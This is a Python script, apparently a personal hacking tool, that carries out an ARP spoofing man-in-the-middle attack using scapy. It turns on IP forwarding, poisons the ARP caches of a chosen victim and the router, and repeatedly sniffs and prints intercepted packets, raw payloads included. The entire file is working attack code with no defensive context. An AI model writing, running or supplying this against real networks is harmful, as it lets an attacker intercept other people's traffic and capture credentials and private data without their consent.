import sys,os,getopt
from scapy.all import *

def usage():
    print("\nARP Spoof/Poison by Dex")
    print()
    print("Usage: -i <interface> -v <victimip> -r <routerip>")
    
    print("Example: -i wlp12s0 -v 192.168.0.32 -r 192.168.0.1")
    print("Example: -i enp2s0 -v 192.168.0.5 -r 192.168.0.1")
    sys.exit(0)

def main():

    interface = ''
    victimip = ''
    routerip = ''

    if not len(sys.argv[1:]):
        usage()

    try:
        opts, args = getopt.getopt(sys.argv[1:],"hi:v:r:",["help","interface=","victimip=","routerip="])
    except getopt.GetoptError as err:
        print(str(err))
        usage()

    for o,a in opts:
        if o in ("-h","--help"):
            usage()
        elif o in ("-i","--interface"):
            interface = sys.argv[2]
        elif o in ("-v","--victimip"):
            victimip = sys.argv[4]
        elif o in ("-r","--routerip"):
            routerip = sys.argv[6]
        else:
            assert False,"Unhandled Option"
       
    MiddleMan(interface, routerip, victimip)

def MACget(IP):
    ans, unans = arping(IP)
    for s, r in ans:
        return r[Ether].src

def Spoof(routerip, victimip):
    victimmac = MACget(victimip)
    routermac = MACget(routerip)
    send(ARP(op = 2, pdst = victimip, psrc = routerip, hwdst = victimmac))
    send(ARP(op = 2, pdst = routerip, psrc = victimip, hwdst = routermac))

def Restore(routerip, victimip):
    victimmac = MACget(victimip)
    routermac = MACget(routerip)
    send(ARP(op = 2, pdst = routerip, psrc = victimip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimmac), count = 4)
    send(ARP(op = 2, pdst = victimip, psrc = routerip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = routermac), count = 4)

def sniffer(interface):
    pkts = sniff(iface = interface, count = 10, prn=lambda x:x.sprintf(" Source: %IP.src% : %Ether.src%, \n %Raw.load% \n\n Reciever: %IP.dst% \n +=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+\n"))
    
def MiddleMan(interface, routerip, victimip):
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    while 1:
        try:
            Spoof(routerip, victimip)
            time.sleep(1)
            sniffer(interface)
            time.sleep(1)
        except KeyboardInterrupt:
            Restore(routerip, victimip)
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            print("\nUser Requested Shutdown, Exiting...")
            sys.exit(1)

if __name__ == "__main__":
    main()
